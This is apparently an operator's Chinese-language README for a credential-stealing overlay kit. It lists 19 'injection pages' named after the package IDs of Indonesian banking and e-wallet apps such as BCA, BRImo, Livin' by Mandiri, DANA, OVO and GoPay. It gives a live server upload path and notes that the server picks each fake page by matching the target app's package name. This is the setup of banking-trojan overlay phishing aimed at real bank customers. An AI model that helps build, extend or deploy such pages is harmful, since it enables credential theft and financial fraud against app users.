# 印度尼西亚（ID）注入页 —— 19 个

文件命名 = 目标包名。来源：`~/Downloads/注入页/`（原始文件名含品牌）。

| # | 品牌 | 包名 | 文件 |
|---|---|---|---|
| 1 | BCA mobile | com.bca | `com.bca.html` |
| 2 | BNI Mobile Banking | src.com.bni | `src.com.bni.html` |
| 3 | BRImo（BRI） | id.co.bri.brimo | `id.co.bri.brimo.html` |
| 4 | BSI Mobile | com.bsm.activity2 | `com.bsm.activity2.html` |
| 5 | Livin' by Mandiri | id.bmri.livin | `id.bmri.livin.html` |
| 6 | OCTO Mobile（CIMB Niaga） | id.co.cimbniaga.mobile.android | `id.co.cimbniaga.mobile.android.html` |
| 7 | D-Bank PRO（Danamon） | com.dbank.mobile | `com.dbank.mobile.html` |
| 8 | blu by BCA Digital | com.bcadigital.blu | `com.bcadigital.blu.html` |
| 9 | SeaBank | id.co.bankbkemobile.digitalbank | `id.co.bankbkemobile.digitalbank.html` |
| 10 | Jago | com.jago.digitalBanking | `com.jago.digitalBanking.html` |
| 11 | Jenius（BTPN） | com.btpn.dc | `com.btpn.dc.html` |
| 12 | Neo+（Bank Neo Commerce） | com.bnc.finance | `com.bnc.finance.html` |
| 13 | balé by BTN | id.co.btn.mobilebanking.android | `id.co.btn.mobilebanking.android.html` |
| 14 | DANA | id.dana | `id.dana.html` |
| 15 | OVO | ovo.id | `ovo.id.html` |
| 16 | GoPay | com.gojek.gopay | `com.gojek.gopay.html` |
| 17 | ShopeePay | com.shopeepay.id | `com.shopeepay.id.html` |
| 18 | LinkAja | com.telkom.mwallet | `com.telkom.mwallet.html` |
| 19 | Flip | id.flip | `id.flip.html` |

## 部署

线上目录：`/www/wwwroot/yk4.jk92.cc/materials/inject/`
服务端按包名匹配文件名（`_find_template()`），本地文件名已是包名，直接上传即可。

## 依赖公共资源

```
../bank.css
../bank.js
../i18n.json.js
```
